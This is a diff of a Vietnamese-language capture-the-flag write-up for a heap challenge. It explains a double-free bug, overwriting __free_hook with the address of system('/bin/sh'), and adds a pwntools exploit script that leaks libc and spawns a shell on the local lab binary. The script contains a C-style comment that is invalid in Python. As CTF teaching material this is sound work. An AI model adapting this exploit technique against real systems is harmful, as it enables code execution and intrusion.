@@ -28,19 +28,43 @@ Tức ta có thể lợi dùng câu lệnh này để ghi đè lên bất kì đ
 ## Lỗi double free
 Tiếp theo thì ở dưới có 2 lệnh free vào cùng vùng nhớ ptr gây ra lỗi double free và crash. Vậy nên dù cuối chương trình có gọi `system('/bin/sh\0')` thì ta cũng không có cách nào truy cập được.
 
+## Mitigation
+<img width="567" height="232" alt="image" src="https://github.com/user-attachments/assets/9df2e0f0-28d5-471b-93eb-679c3ac04e81" />
+
 # Khai thác
 
 Ý tưởng khai thác ở đây là ghi đè vào `__free_hook` địa chỉ lệnh `system('/bin/sh')` để tạo shell ngay khi gọi free().
 
-## Mitigation
-<img width="567" height="232" alt="image" src="https://github.com/user-attachments/assets/9df2e0f0-28d5-471b-93eb-679c3ac04e81" />
-
-## Leak libc
 <img width="662" height="182" alt="image" src="https://github.com/user-attachments/assets/3ec2bef9-8d55-4c24-9f8c-b9206f24f13d" />
 <img width="1077" height="207" alt="image" src="https://github.com/user-attachments/assets/95101396-eaeb-46c1-ae25-43a872ce923f" />
 
-Chương trình cho ta sẵn địa chỉ libc. Từ đó tính được libc base và địa chỉ `__free_hook`.
+Chương trình cho ta sẵn địa chỉ libc. Từ đó tính được libc base và địa chỉ `__free_hook`. Sau đó đưa lần lượt địa chỉ `__free_hook` và `system('/bin/sh')` vào 8 BYTES đầu và 8 BYTES sau của ptr.
 
-Sau
+# Script Python
+
+    #!/usr/bin/env python3
+    
+    from pwn import *
+    
+    exe = ELF("./hook_patched")
+    libc = ELF("./libc-2.23.so")
+    ld = ELF("./ld-2.23.so")
+    
+    context.binary = exe
+    p=process(exe.path)
+    
+    p.recvuntil(b'stdout: ')
+    libc_leak=int(p.recvline()[:-1],16)
+    libc.address=libc_leak-0x3c5620
+    
+    payload=flat(
+        libc.sym['__free_hook'],
+         0x0000000000400a11        //địa chỉ hàm system
+        )
+    
+    p.sendlineafter(b'Size: ',b'100')
+    p.sendlineafter(b'Data: ',payload)
+    
+    p.interactive()
 
 
